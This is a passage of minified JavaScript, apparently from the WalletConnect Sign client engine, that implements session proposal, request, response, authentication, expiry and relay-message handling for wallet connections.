                        metadata: f.metadata
                    }),
                    await this.client.proposal.delete(i, Dg("USER_DISCONNECTED")),
                    await this.client.core.pairing.activate({
                        topic: h
                    }),
                    await this.setExpiry(v, hu(QT)),
                    {
                        topic: v,
                        acknowledged: () => Promise.resolve(this.client.session.get(v))
                    }
                }
                )),
                mA(this, "reject", (async e => {
                    this.isInitialized(),
                    await this.confirmOnlineStateOrThrow();
                    try {
                        await this.isValidReject(e)
                    } catch (M) {
                        throw this.client.logger.error("reject() -> isValidReject() failed"),
                        M
                    }
                    const {id: t, reason: r} = e;
                    let n;
                    try {
                        n = this.client.proposal.get(t).pairingTopic
                    } catch (M) {
                        throw this.client.logger.error("reject() -> proposal.get(".concat(t, ") failed")),
                        M
                    }
                    n && (await this.sendError({
                        id: t,
                        topic: n,
                        error: r,
                        rpcOpts: eA.wc_sessionPropose.reject
                    }),
                    await this.client.proposal.delete(t, Dg("USER_DISCONNECTED")))
                }
                )),
                mA(this, "update", (async e => {
                    this.isInitialized(),
                    await this.confirmOnlineStateOrThrow();
                    try {
                        await this.isValidUpdate(e)
                    } catch (ht) {
                        throw this.client.logger.error("update() -> isValidUpdate() failed"),
                        ht
                    }
                    const {topic: t, namespaces: r} = e
                      , {done: n, resolve: o, reject: i} = cu()
                      , s = Cy()
                      , a = Sy().toString()
                      , c = this.client.session.get(t).namespaces;
                    return this.events.once(pu("session_update", s), (e => {
                        let {error: t} = e;
                        t ? i(t) : o()
                    }
                    )),
                    await this.client.session.update(t, {
                        namespaces: r
                    }),
                    await this.sendRequest({
                        topic: t,
                        method: "wc_sessionUpdate",
                        params: {
                            namespaces: r
                        },
                        throwOnFailedPublish: !0,
                        clientRpcId: s,
                        relayRpcId: a
                    }).catch((e => {
                        this.client.logger.error(e),
                        this.client.session.update(t, {
                            namespaces: c
                        }),
                        i(e)
                    }
                    )),
                    {
                        acknowledged: n
                    }
                }
                )),
                mA(this, "extend", (async e => {
                    this.isInitialized(),
                    await this.confirmOnlineStateOrThrow();
                    try {
                        await this.isValidExtend(e)
                    } catch (Nt) {
                        throw this.client.logger.error("extend() -> isValidExtend() failed"),
                        Nt
                    }
                    const {topic: t} = e
                      , r = Cy()
                      , {done: n, resolve: o, reject: i} = cu();
                    return this.events.once(pu("session_extend", r), (e => {
                        let {error: t} = e;
                        t ? i(t) : o()
                    }
                    )),
                    await this.setExpiry(t, hu(QT)),
                    this.sendRequest({
                        topic: t,
                        method: "wc_sessionExtend",
                        params: {},
                        clientRpcId: r,
                        throwOnFailedPublish: !0
                    }).catch((e => {
                        i(e)
                    }
                    )),
                    {
                        acknowledged: n
                    }
                }
                )),
                mA(this, "request", (async e => {
                    this.isInitialized();
                    try {
                        await this.isValidRequest(e)
                    } catch (de) {
                        throw this.client.logger.error("request() -> isValidRequest() failed"),
                        de
                    }
                    const {chainId: t, request: r, topic: n, expiry: o=eA.wc_sessionRequest.req.ttl} = e
                      , i = this.client.session.get(n);
                    (null === i || void 0 === i ? void 0 : i.transportType) === hm.relay && await this.confirmOnlineStateOrThrow();
                    const s = Cy()
                      , a = Sy().toString()
                      , {done: c, resolve: l, reject: u} = cu(o, "Request expired. Please try again.");
                    this.events.once(pu("session_request", s), (e => {
                        let {error: t, result: r} = e;
                        t ? u(t) : l(r)
                    }
                    ));
                    const d = "wc_sessionRequest"
                      , h = this.getAppLinkIfEnabled(i.peer.metadata, i.transportType);
                    if (h)
                        return await this.sendRequest({
                            clientRpcId: s,
                            relayRpcId: a,
                            topic: n,
                            method: d,
                            params: {
                                request: yA(gA({}, r), {
                                    expiryTimestamp: hu(o)
                                }),
                                chainId: t
                            },
                            expiry: o,
                            throwOnFailedPublish: !0,
                            appLink: h
                        }).catch((e => u(e))),
                        this.client.events.emit("session_request_sent", {
                            topic: n,
                            request: r,
                            chainId: t,
                            id: s
                        }),
                        await c();
                    const f = {
                        request: yA(gA({}, r), {
                            expiryTimestamp: hu(o)
                        }),
                        chainId: t
                    };
                    return await Promise.all([new Promise((async e => {
                        await this.sendRequest({
                            clientRpcId: s,
                            relayRpcId: a,
                            topic: n,
                            method: d,
                            params: f,
                            expiry: o,
                            throwOnFailedPublish: !0,
                            tvf: this.getTVFParams(s, f)
                        }).catch((e => u(e))),
                        this.client.events.emit("session_request_sent", {
                            topic: n,
                            request: r,
                            chainId: t,
                            id: s
                        }),
                        e()
                    }
                    )), new Promise((async e => {
                        var t;
                        if (null == (t = i.sessionConfig) || !t.disableDeepLink) {
                            const e = await async function(e, t) {
                                let r = "";
                                try {
                                    if (Xl() && (r = localStorage.getItem(t),
                                    r))
                                        return r;
                                    r = await e.getItem(t)
                                } catch (o) {
                                    console.error(o)
                                }
                                return r
                            }(this.client.core.storage, JT);
                            await yu({
                                id: s,
                                topic: n,
                                wcDeepLink: e
                            })
                        }
                        e()
                    }
                    )), c()]).then((e => e[2]))
                }
                )),
                mA(this, "respond", (async e => {
                    this.isInitialized(),
                    await this.isValidRespond(e);
                    const {topic: t, response: r} = e
                      , {id: n} = r
                      , o = this.client.session.get(t);
                    o.transportType === hm.relay && await this.confirmOnlineStateOrThrow();
                    const i = this.getAppLinkIfEnabled(o.peer.metadata, o.transportType);
                    Ly(r) ? await this.sendResult({
                        id: n,
                        topic: t,
                        result: r.result,
                        throwOnFailedPublish: !0,
                        appLink: i
                    }) : jy(r) && await this.sendError({
                        id: n,
                        topic: t,
                        error: r.error,
                        appLink: i
                    }),
                    this.cleanupAfterResponse(e)
                }
                )),
                mA(this, "ping", (async e => {
                    this.isInitialized(),
                    await this.confirmOnlineStateOrThrow();
                    try {
                        await this.isValidPing(e)
                    } catch (_e) {
                        throw this.client.logger.error("ping() -> isValidPing() failed"),
                        _e
                    }
                    const {topic: t} = e;
                    if (this.client.session.keys.includes(t)) {
                        const e = Cy()
                          , r = Sy().toString()
                          , {done: n, resolve: o, reject: i} = cu();
                        this.events.once(pu("session_ping", e), (e => {
                            let {error: t} = e;
                            t ? i(t) : o()
                        }
                        )),
                        await Promise.all([this.sendRequest({
                            topic: t,
                            method: "wc_sessionPing",
                            params: {},
                            throwOnFailedPublish: !0,
                            clientRpcId: e,
                            relayRpcId: r
                        }), n()])
                    } else
                        this.client.core.pairing.pairings.keys.includes(t) && (this.client.logger.warn("ping() on pairing topic is deprecated and will be removed in the next major release."),
                        await this.client.core.pairing.ping({
                            topic: t
                        }))
                }
                )),
                mA(this, "emit", (async e => {
                    this.isInitialized(),
                    await this.confirmOnlineStateOrThrow(),
                    await this.isValidEmit(e);
                    const {topic: t, event: r, chainId: n} = e
                      , o = Sy().toString()
                      , i = Cy();
                    await this.sendRequest({
                        topic: t,
                        method: "wc_sessionEvent",
                        params: {
                            event: r,
                            chainId: n
                        },
                        throwOnFailedPublish: !0,
                        relayRpcId: o,
                        clientRpcId: i
                    })
                }
                )),
                mA(this, "disconnect", (async e => {
                    this.isInitialized(),
                    await this.confirmOnlineStateOrThrow(),
                    await this.isValidDisconnect(e);
                    const {topic: t} = e;
                    if (this.client.session.keys.includes(t))
                        await this.sendRequest({
                            topic: t,
                            method: "wc_sessionDelete",
                            params: Dg("USER_DISCONNECTED"),
                            throwOnFailedPublish: !0
                        }),
                        await this.deleteSession({
                            topic: t,
                            emitEvent: !1
                        });
                    else {
                        if (!this.client.core.pairing.pairings.keys.includes(t)) {
                            const {message: e} = Ug("MISMATCHED_TOPIC", "Session or pairing topic not found: ".concat(t));
                            throw new Error(e)
                        }
                        await this.client.core.pairing.disconnect({
                            topic: t
                        })
                    }
                }
                )),
                mA(this, "find", (e => (this.isInitialized(),
                this.client.session.getAll().filter((t => function(e, t) {
                    const {requiredNamespaces: r} = t
                      , n = Object.keys(e.namespaces)
                      , o = Object.keys(r);
                    let i = !0;
                    return !!iu(o, n) && (n.forEach((t => {
                        const {accounts: n, methods: o, events: s} = e.namespaces[t]
                          , a = _g(n)
                          , c = r[t];
                        (!iu(Nl(t, c), a) || !iu(c.methods, o) || !iu(c.events, s)) && (i = !1)
                    }
                    )),
                    i)
                }(t, e)))))),
                mA(this, "getPendingSessionRequests", ( () => this.client.pendingRequest.getAll())),
                mA(this, "authenticate", (async (e, t) => {
                    var r;
                    this.isInitialized(),
                    this.isValidAuthenticate(e);
                    const n = t && this.client.core.linkModeSupportedApps.includes(t) && (null == (r = this.client.metadata.redirect) ? void 0 : r.linkMode)
                      , o = n ? hm.link_mode : hm.relay;
                    o === hm.relay && await this.confirmOnlineStateOrThrow();
                    const {chains: i, statement: s="", uri: a, domain: c, nonce: l, type: u, exp: d, nbf: h, methods: f=[], expiry: p} = e
                      , g = [...e.resources || []]
                      , {topic: y, uri: m} = await this.client.core.pairing.create({
                        methods: ["wc_sessionAuthenticate"],
                        transportType: o
                    });
                    this.client.logger.info({
                        message: "Generated new pairing",
                        pairing: {
                            topic: y,
                            uri: m
                        }
                    });
                    const b = await this.client.core.crypto.generateKeyPair()
                      , v = ng(b);
                    if (await Promise.all([this.client.auth.authKeys.set(aA, {
                        responseTopic: v,
                        publicKey: b
                    }), this.client.auth.pairingTopics.set(v, {
                        topic: v,
                        pairingTopic: y
                    })]),
                    await this.client.core.relayer.subscribe(v, {
                        transportType: o
                    }),
                    this.client.logger.info("sending request to new pairing topic: ".concat(y)),
                    f.length > 0) {
                        const {namespace: e} = Ml(i[0]);
                        let t = Eh(e, "request", f);
                        xh(g) && (t = Ch(t, g.pop())),
                        g.push(t)
                    }
                    const w = p && p > eA.wc_sessionAuthenticate.req.ttl ? p : eA.wc_sessionAuthenticate.req.ttl
                      , T = {
                        authPayload: {
                            type: null !== u && void 0 !== u ? u : "caip122",
                            chains: i,
                            statement: s,
                            aud: a,
                            domain: c,
                            version: "1",
                            nonce: l,
                            iat: (new Date).toISOString(),
                            exp: d,
                            nbf: h,
                            resources: g
                        },
                        requester: {
                            publicKey: b,
                            metadata: this.client.metadata
                        },
                        expiryTimestamp: hu(w)
                    }
                      , A = {
                        requiredNamespaces: {},
                        optionalNamespaces: {
                            eip155: {
                                chains: i,
                                methods: [...new Set(["personal_sign", ...f])],
                                events: ["chainChanged", "accountsChanged"]
                            }
                        },
                        relays: [{
                            protocol: "irn"
                        }],
                        pairingTopic: y,
                        proposer: {
                            publicKey: b,
                            metadata: this.client.metadata
                        },
                        expiryTimestamp: hu(eA.wc_sessionPropose.req.ttl),
                        id: Cy()
                    }
                      , {done: E, resolve: P, reject: C} = cu(w, "Request expired")
                      , S = Cy()
                      , I = pu("session_connect", A.id)
                      , B = pu("session_request", S)
                      , x = async e => {
                        let {error: t, session: r} = e;
                        this.events.off(B, O),
                        t ? C(t) : r && P({
                            session: r
                        })
                    }
                      , O = async e => {
                        var r, n, i;
                        if (await this.deletePendingAuthRequest(S, {
                            message: "fulfilled",
                            code: 0
                        }),
                        e.error) {
                            const t = Dg("WC_METHOD_UNSUPPORTED", "wc_sessionAuthenticate");
                            return e.error.code === t.code ? void 0 : (this.events.off(I, x),
                            C(e.error.message))
                        }
                        await this.deleteProposal(A.id),
                        this.events.off(I, x);
                        const {cacaos: s, responder: a} = e.result
                          , c = []
                          , l = [];
                        for (const t of s) {
                            await mh({
                                cacao: t,
                                projectId: this.client.core.projectId
                            }) || (this.client.logger.error(t, "Signature verification failed"),
                            C(Dg("SESSION_SETTLEMENT_FAILED", "Signature verification failed")));
                            const {p: e} = t
                              , r = xh(e.resources)
                              , n = [gh(e.iss)]
                              , o = yh(e.iss);
                            if (r) {
                                const e = Ih(r)
                                  , t = Bh(r);
                                c.push(...e),
                                n.push(...t)
                            }
                            for (const t of n)
                                l.push("".concat(t, ":").concat(o))
                        }
                        const u = await this.client.core.crypto.generateSharedKey(b, a.publicKey);
                        let d;
                        c.length > 0 && (d = {
                            topic: u,
                            acknowledged: !0,
                            self: {
                                publicKey: b,
                                metadata: this.client.metadata
                            },
                            peer: a,
                            controller: a.publicKey,
                            expiry: hu(QT),
                            requiredNamespaces: {},
                            optionalNamespaces: {},
                            relay: {
                                protocol: "irn"
                            },
                            pairingTopic: y,
                            namespaces: Mg([...new Set(c)], [...new Set(l)]),
                            transportType: o
                        },
                        await this.client.core.relayer.subscribe(u, {
                            transportType: o
                        }),
                        await this.client.session.set(u, d),
                        y && await this.client.core.pairing.updateMetadata({
                            topic: y,
                            metadata: a.metadata
                        }),
                        d = this.client.session.get(u)),
                        null != (r = this.client.metadata.redirect) && r.linkMode && null != (n = a.metadata.redirect) && n.linkMode && null != (i = a.metadata.redirect) && i.universal && t && (this.client.core.addLinkModeSupportedApp(a.metadata.redirect.universal),
                        this.client.session.update(u, {
                            transportType: hm.link_mode
                        })),
                        P({
                            auths: s,
                            session: d
                        })
                    }
                    ;
                    let _;
                    this.events.once(I, x),
                    this.events.once(B, O);
                    try {
                        if (n) {
                            const e = Iy("wc_sessionAuthenticate", T, S);
                            this.client.core.history.set(y, e);
                            const r = await this.client.core.crypto.encode("", e, {
                                type: 2,
                                encoding: eg
                            });
                            _ = Tg(t, y, r)
                        } else
                            await Promise.all([this.sendRequest({
                                topic: y,
                                method: "wc_sessionAuthenticate",
                                params: T,
                                expiry: e.expiry,
                                throwOnFailedPublish: !0,
                                clientRpcId: S
                            }), this.sendRequest({
                                topic: y,
                                method: "wc_sessionPropose",
                                params: A,
                                expiry: eA.wc_sessionPropose.req.ttl,
                                throwOnFailedPublish: !0,
                                clientRpcId: A.id
                            })])
                    } catch (W) {
                        throw this.events.off(I, x),
                        this.events.off(B, O),
                        W
                    }
                    return await this.setProposal(A.id, A),
                    await this.setAuthRequest(S, {
                        request: yA(gA({}, T), {
                            verifyContext: {}
                        }),
                        pairingTopic: y,
                        transportType: o
                    }),
                    {
                        uri: null !== _ && void 0 !== _ ? _ : m,
                        response: E
                    }
                }
                )),
                mA(this, "approveSessionAuthenticate", (async e => {
                    const {id: t, auths: r} = e
                      , n = this.client.core.eventClient.createEvent({
                        properties: {
                            topic: t.toString(),
                            trace: [gb]
                        }
                    });
                    try {
                        this.isInitialized()
                    } catch (de) {
                        throw n.setError(Ab),
                        de
                    }
                    const o = this.getPendingAuthRequest(t);
                    if (!o)
                        throw n.setError(Sb),
                        new Error("Could not find pending auth request with id ".concat(t));
                    const i = o.transportType || hm.relay;
                    i === hm.relay && await this.confirmOnlineStateOrThrow();
                    const s = o.requester.publicKey
                      , a = await this.client.core.crypto.generateKeyPair()
                      , c = ng(s)
                      , l = {
                        type: 1,
                        receiverPublicKey: s,
                        senderPublicKey: a
                    }
                      , u = []
                      , d = [];
                    for (const p of r) {
                        if (!await mh({
                            cacao: p,
                            projectId: this.client.core.projectId
                        })) {
                            n.setError(Eb);
                            const e = Dg("SESSION_SETTLEMENT_FAILED", "Signature verification failed");
                            throw await this.sendError({
                                id: t,
                                topic: c,
                                error: e,
                                encodeOpts: l
                            }),
                            new Error(e.message)
                        }
                        n.addTrace(mb);
                        const {p: e} = p
                          , r = xh(e.resources)
                          , o = [gh(e.iss)]
                          , i = yh(e.iss);
                        if (r) {
                            const e = Ih(r)
                              , t = Bh(r);
                            u.push(...e),
                            o.push(...t)
                        }
                        for (const t of o)
                            d.push("".concat(t, ":").concat(i))
                    }
                    const h = await this.client.core.crypto.generateSharedKey(a, s);
                    let f;
                    if (n.addTrace(yb),
                    (null === u || void 0 === u ? void 0 : u.length) > 0) {
                        f = {
                            topic: h,
                            acknowledged: !0,
                            self: {
                                publicKey: a,
                                metadata: this.client.metadata
                            },
                            peer: {
                                publicKey: s,
                                metadata: o.requester.metadata
                            },
                            controller: s,
                            expiry: hu(QT),
                            authentication: r,
                            requiredNamespaces: {},
                            optionalNamespaces: {},
                            relay: {
                                protocol: "irn"
                            },
                            pairingTopic: o.pairingTopic,
                            namespaces: Mg([...new Set(u)], [...new Set(d)]),
                            transportType: i
                        },
                        n.addTrace(vb);
                        try {
                            await this.client.core.relayer.subscribe(h, {
                                transportType: i
                            })
                        } catch (de) {
                            throw n.setError(Pb),
                            de
                        }
                        n.addTrace(wb),
                        await this.client.session.set(h, f),
                        n.addTrace(bb),
                        await this.client.core.pairing.updateMetadata({
                            topic: o.pairingTopic,
                            metadata: o.requester.metadata
                        })
                    }
                    n.addTrace(Tb);
                    try {
                        await this.sendResult({
                            topic: c,
                            id: t,
                            result: {
                                cacaos: r,
                                responder: {
                                    publicKey: a,
                                    metadata: this.client.metadata
                                }
                            },
                            encodeOpts: l,
                            throwOnFailedPublish: !0,
                            appLink: this.getAppLinkIfEnabled(o.requester.metadata, i)
                        })
                    } catch (de) {
                        throw n.setError(Cb),
                        de
                    }
                    return await this.client.auth.requests.delete(t, {
                        message: "fulfilled",
                        code: 0
                    }),
                    await this.client.core.pairing.activate({
                        topic: o.pairingTopic
                    }),
                    this.client.core.eventClient.deleteEvent({
                        eventId: n.eventId
                    }),
                    {
                        session: f
                    }
                }
                )),
                mA(this, "rejectSessionAuthenticate", (async e => {
                    this.isInitialized();
                    const {id: t, reason: r} = e
                      , n = this.getPendingAuthRequest(t);
                    if (!n)
                        throw new Error("Could not find pending auth request with id ".concat(t));
                    n.transportType === hm.relay && await this.confirmOnlineStateOrThrow();
                    const o = n.requester.publicKey
                      , i = await this.client.core.crypto.generateKeyPair()
                      , s = ng(o)
                      , a = {
                        type: 1,
                        receiverPublicKey: o,
                        senderPublicKey: i
                    };
                    await this.sendError({
                        id: t,
                        topic: s,
                        error: r,
                        encodeOpts: a,
                        rpcOpts: eA.wc_sessionAuthenticate.reject,
                        appLink: this.getAppLinkIfEnabled(n.requester.metadata, n.transportType)
                    }),
                    await this.client.auth.requests.delete(t, {
                        message: "rejected",
                        code: 0
                    }),
                    await this.client.proposal.delete(t, Dg("USER_DISCONNECTED"))
                }
                )),
                mA(this, "formatAuthMessage", (e => {
                    this.isInitialized();
                    const {request: t, iss: r} = e;
                    return bh(t, r)
                }
                )),
                mA(this, "processRelayMessageCache", ( () => {
                    setTimeout((async () => {
                        if (0 !== this.relayMessageCache.length)
                            for (; this.relayMessageCache.length > 0; )
                                try {
                                    const e = this.relayMessageCache.shift();
                                    e && await this.onRelayMessage(e)
                                } catch (cf) {
                                    this.client.logger.error(cf)
                                }
                    }
                    ), 50)
                }
                )),
                mA(this, "cleanupDuplicatePairings", (async e => {
                    if (e.pairingTopic)
                        try {
                            const t = this.client.core.pairing.pairings.get(e.pairingTopic)
                              , r = this.client.core.pairing.pairings.getAll().filter((r => {
                                var n, o;
                                return (null == (n = r.peerMetadata) ? void 0 : n.url) && (null == (o = r.peerMetadata) ? void 0 : o.url) === e.peer.metadata.url && r.topic && r.topic !== t.topic
                            }
                            ));
                            if (0 === r.length)
                                return;
                            this.client.logger.info("Cleaning up ".concat(r.length, " duplicate pairing(s)")),
                            await Promise.all(r.map((e => this.client.core.pairing.disconnect({
                                topic: e.topic
                            })))),
                            this.client.logger.info("Duplicate pairings clean up finished")
                        } catch (_l) {
                            this.client.logger.error(_l)
                        }
                }
                )),
                mA(this, "deleteSession", (async e => {
                    var t;
                    const {topic: r, expirerHasDeleted: n=!1, emitEvent: o=!0, id: i=0} = e
                      , {self: s} = this.client.session.get(r);
                    await this.client.core.relayer.unsubscribe(r),
                    await this.client.session.delete(r, Dg("USER_DISCONNECTED")),
                    this.addToRecentlyDeleted(r, "session"),
                    this.client.core.crypto.keychain.has(s.publicKey) && await this.client.core.crypto.deleteKeyPair(s.publicKey),
                    this.client.core.crypto.keychain.has(r) && await this.client.core.crypto.deleteSymKey(r),
                    n || this.client.core.expirer.del(r),
                    this.client.core.storage.removeItem(JT).catch((e => this.client.logger.warn(e))),
                    this.getPendingSessionRequests().forEach((e => {
                        e.topic === r && this.deletePendingSessionRequest(e.id, Dg("USER_DISCONNECTED"))
                    }
                    )),
                    r === (null == (t = this.sessionRequestQueue.queue[0]) ? void 0 : t.topic) && (this.sessionRequestQueue.state = rA),
                    o && this.client.events.emit("session_delete", {
                        id: i,
                        topic: r
                    })
                }
                )),
                mA(this, "deleteProposal", (async (e, t) => {
                    if (t)
                        try {
                            const t = this.client.proposal.get(e)
                              , r = this.client.core.eventClient.getEvent({
                                topic: t.pairingTopic
                            });
                            null === r || void 0 === r || r.setError(lb)
                        } catch (r) {}
                    await Promise.all([this.client.proposal.delete(e, Dg("USER_DISCONNECTED")), t ? Promise.resolve() : this.client.core.expirer.del(e)]),
                    this.addToRecentlyDeleted(e, "proposal")
                }
                )),
                mA(this, "deletePendingSessionRequest", (async function(e, r) {
                    let n = arguments.length > 2 && void 0 !== arguments[2] && arguments[2];
                    await Promise.all([t.client.pendingRequest.delete(e, r), n ? Promise.resolve() : t.client.core.expirer.del(e)]),
                    t.addToRecentlyDeleted(e, "request"),
                    t.sessionRequestQueue.queue = t.sessionRequestQueue.queue.filter((t => t.id !== e)),
                    n && (t.sessionRequestQueue.state = rA,
                    t.client.events.emit("session_request_expire", {
                        id: e
                    }))
                }
                )),
                mA(this, "deletePendingAuthRequest", (async function(e, r) {
                    let n = arguments.length > 2 && void 0 !== arguments[2] && arguments[2];
                    await Promise.all([t.client.auth.requests.delete(e, r), n ? Promise.resolve() : t.client.core.expirer.del(e)])
                }
                )),
                mA(this, "setExpiry", (async (e, t) => {
                    this.client.session.keys.includes(e) && (this.client.core.expirer.set(e, t),
                    await this.client.session.update(e, {
                        expiry: t
                    }))
                }
                )),
                mA(this, "setProposal", (async (e, t) => {
                    this.client.core.expirer.set(e, hu(eA.wc_sessionPropose.req.ttl)),
                    await this.client.proposal.set(e, t)
                }
                )),
                mA(this, "setAuthRequest", (async (e, t) => {
                    const {request: r, pairingTopic: n, transportType: o=hm.relay} = t;
                    this.client.core.expirer.set(e, r.expiryTimestamp),
                    await this.client.auth.requests.set(e, {
                        authPayload: r.authPayload,
                        requester: r.requester,
                        expiryTimestamp: r.expiryTimestamp,
                        id: e,
                        pairingTopic: n,
                        verifyContext: r.verifyContext,
                        transportType: o
                    })
                }
                )),
                mA(this, "setPendingSessionRequest", (async e => {
                    const {id: t, topic: r, params: n, verifyContext: o} = e
                      , i = n.request.expiryTimestamp || hu(eA.wc_sessionRequest.req.ttl);
                    this.client.core.expirer.set(t, i),
                    await this.client.pendingRequest.set(t, {
                        id: t,
                        topic: r,
                        params: n,
                        verifyContext: o
                    })
                }
                )),
                mA(this, "sendRequest", (async e => {
                    const {topic: t, method: n, params: o, expiry: i, relayRpcId: s, clientRpcId: a, throwOnFailedPublish: c, appLink: l, tvf: u} = e
                      , d = Iy(n, o, a);
                    let h;
                    const f = !!l;
                    try {
                        const e = f ? eg : Qp;
                        h = await this.client.core.crypto.encode(t, d, {
                            encoding: e
                        })
                    } catch (y) {
                        throw await this.cleanup(),
                        this.client.logger.error("sendRequest() -> core.crypto.encode() for topic ".concat(t, " failed")),
                        y
                    }
                    let p;
                    if (iA.includes(n)) {
                        const e = og(JSON.stringify(d))
                          , t = og(h);
                        p = await this.client.core.verify.register({
                            id: t,
                            decryptedId: e
                        })
                    }
                    const g = eA[n].req;
                    if (g.attestation = p,
                    i && (g.ttl = i),
                    s && (g.id = s),
                    this.client.core.history.set(t, d),
                    f) {
                        const e = Tg(l, t, h);
                        await r.g.Linking.openURL(e, this.client.name)
                    } else {
                        const e = eA[n].req;
                        i && (e.ttl = i),
                        s && (e.id = s),
                        e.tvf = yA(gA({}, u), {
                            correlationId: d.id
                        }),
                        c ? (e.internal = yA(gA({}, e.internal), {
                            throwOnFailedPublish: !0
                        }),
                        await this.client.core.relayer.publish(t, h, e)) : this.client.core.relayer.publish(t, h, e).catch((e => this.client.logger.error(e)))
                    }
                    return d.id
                }
                )),
                mA(this, "sendResult", (async e => {
                    const {id: t, topic: n, result: o, throwOnFailedPublish: i, encodeOpts: s, appLink: a} = e
                      , c = By(t, o);
                    let l;
                    const u = a && typeof (null == r.g ? void 0 : r.g.Linking) < "u";
                    try {
                        const e = u ? eg : Qp;
                        l = await this.client.core.crypto.encode(n, c, yA(gA({}, s || {}), {
                            encoding: e
                        }))
                    } catch (f) {
                        throw await this.cleanup(),
                        this.client.logger.error("sendResult() -> core.crypto.encode() for topic ".concat(n, " failed")),
                        f
                    }
                    let d, h;
                    try {
                        d = await this.client.core.history.get(n, t);
                        const e = d.request;
                        try {
                            h = this.getTVFParams(t, e.params, o)
                        } catch (Tt) {
                            this.client.logger.warn("sendResult() -> getTVFParams() failed", Tt)
                        }
                    } catch (f) {
                        throw this.client.logger.error("sendResult() -> history.get(".concat(n, ", ").concat(t, ") failed")),
                        f
                    }
                    if (u) {
                        const e = Tg(a, n, l);
                        await r.g.Linking.openURL(e, this.client.name)
                    } else {
                        const e = d.request.method
                          , r = eA[e].res;
                        r.tvf = yA(gA({}, h), {
                            correlationId: t
                        }),
                        i ? (r.internal = yA(gA({}, r.internal), {
                            throwOnFailedPublish: !0
                        }),
                        await this.client.core.relayer.publish(n, l, r)) : this.client.core.relayer.publish(n, l, r).catch((e => this.client.logger.error(e)))
                    }
                    await this.client.core.history.resolve(c)
                }
                )),
                mA(this, "sendError", (async e => {
                    const {id: t, topic: n, error: o, encodeOpts: i, rpcOpts: s, appLink: a} = e
                      , c = xy(t, o);
                    let l;
                    const u = a && typeof (null == r.g ? void 0 : r.g.Linking) < "u";
                    try {
                        const e = u ? eg : Qp;
                        l = await this.client.core.crypto.encode(n, c, yA(gA({}, i || {}), {
                            encoding: e
                        }))
                    } catch (vt) {
                        throw await this.cleanup(),
                        this.client.logger.error("sendError() -> core.crypto.encode() for topic ".concat(n, " failed")),
                        vt
                    }
                    let d;
                    try {
                        d = await this.client.core.history.get(n, t)
                    } catch (vt) {
                        throw this.client.logger.error("sendError() -> history.get(".concat(n, ", ").concat(t, ") failed")),
                        vt
                    }
                    if (u) {
                        const e = Tg(a, n, l);
                        await r.g.Linking.openURL(e, this.client.name)
                    } else {
                        const e = d.request.method
                          , t = s || eA[e].res;
                        this.client.core.relayer.publish(n, l, t)
                    }
                    await this.client.core.history.resolve(c)
                }
                )),
                mA(this, "cleanup", (async () => {
                    const e = []
                      , t = [];
                    this.client.session.getAll().forEach((t => {
                        let r = !1;
                        fu(t.expiry) && (r = !0),
                        this.client.core.crypto.keychain.has(t.topic) || (r = !0),
                        r && e.push(t.topic)
                    }
                    )),
                    this.client.proposal.getAll().forEach((e => {
                        fu(e.expiryTimestamp) && t.push(e.id)
                    }
                    )),
                    await Promise.all([...e.map((e => this.deleteSession({
                        topic: e
                    }))), ...t.map((e => this.deleteProposal(e)))])
                }
                )),
                mA(this, "onProviderMessageEvent", (async e => {
                    !this.initialized || this.relayMessageCache.length > 0 ? this.relayMessageCache.push(e) : await this.onRelayMessage(e)
                }
                )),
                mA(this, "onRelayEventRequest", (async e => {
                    this.requestQueue.queue.push(e),
                    await this.processRequestsQueue()
                }
                )),
                mA(this, "processRequestsQueue", (async () => {
                    if (this.requestQueue.state !== nA) {
                        for (this.client.logger.info("Request queue starting with ".concat(this.requestQueue.queue.length, " requests")); this.requestQueue.queue.length > 0; ) {
                            this.requestQueue.state = nA;
                            const e = this.requestQueue.queue.shift();
                            if (e)
                                try {
                                    await this.processRequest(e)
                                } catch (_l) {
                                    this.client.logger.warn(_l)
                                }
                        }
                        this.requestQueue.state = rA
                    } else
                        this.client.logger.info("Request queue already active, skipping...")
                }
                )),
                mA(this, "processRequest", (async e => {
                    const {topic: t, payload: r, attestation: n, transportType: o, encryptedId: i} = e
                      , s = r.method;
                    if (!this.shouldIgnorePairingRequest({
                        topic: t,
                        requestMethod: s
                    }))
                        switch (s) {
                        case "wc_sessionPropose":
                            return await this.onSessionProposeRequest({
                                topic: t,
                                payload: r,
                                attestation: n,
                                encryptedId: i
                            });
                        case "wc_sessionSettle":
                            return await this.onSessionSettleRequest(t, r);
                        case "wc_sessionUpdate":
                            return await this.onSessionUpdateRequest(t, r);
                        case "wc_sessionExtend":
                            return await this.onSessionExtendRequest(t, r);
                        case "wc_sessionPing":
                            return await this.onSessionPingRequest(t, r);
                        case "wc_sessionDelete":
                            return await this.onSessionDeleteRequest(t, r);
                        case "wc_sessionRequest":
                            return await this.onSessionRequest({
                                topic: t,
                                payload: r,
                                attestation: n,
                                encryptedId: i,
                                transportType: o
                            });
                        case "wc_sessionEvent":
                            return await this.onSessionEventRequest(t, r);
                        case "wc_sessionAuthenticate":
                            return await this.onSessionAuthenticateRequest({
                                topic: t,
                                payload: r,
                                attestation: n,
                                encryptedId: i,
                                transportType: o
                            });
                        default:
                            return this.client.logger.info("Unsupported request method ".concat(s))
                        }
                }
                )),
                mA(this, "onRelayEventResponse", (async e => {
                    const {topic: t, payload: r, transportType: n} = e
                      , o = (await this.client.core.history.get(t, r.id)).request.method;
                    switch (o) {
                    case "wc_sessionPropose":
                        return this.onSessionProposeResponse(t, r, n);
                    case "wc_sessionSettle":
                        return this.onSessionSettleResponse(t, r);
                    case "wc_sessionUpdate":
                        return this.onSessionUpdateResponse(t, r);
                    case "wc_sessionExtend":
                        return this.onSessionExtendResponse(t, r);
                    case "wc_sessionPing":
                        return this.onSessionPingResponse(t, r);
                    case "wc_sessionRequest":
                        return this.onSessionRequestResponse(t, r);
                    case "wc_sessionAuthenticate":
                        return this.onSessionAuthenticateResponse(t, r);
                    default:
                        return this.client.logger.info("Unsupported response method ".concat(o))
                    }
                }
                )),
                mA(this, "onRelayEventUnknownPayload", (e => {
                    const {topic: t} = e
                      , {message: r} = Ug("MISSING_OR_INVALID", "Decoded payload on topic ".concat(t, " is not identifiable as a JSON-RPC request or a response."));
                    throw new Error(r)
                }
                )),
                mA(this, "shouldIgnorePairingRequest", (e => {
                    const {topic: t, requestMethod: r} = e
                      , n = this.expectedPairingMethodMap.get(t);
                    return !(!n || n.includes(r)) && !!(n.includes("wc_sessionAuthenticate") && this.client.events.listenerCount("session_authenticate") > 0)
                }
                )),
                mA(this, "onSessionProposeRequest", (async e => {
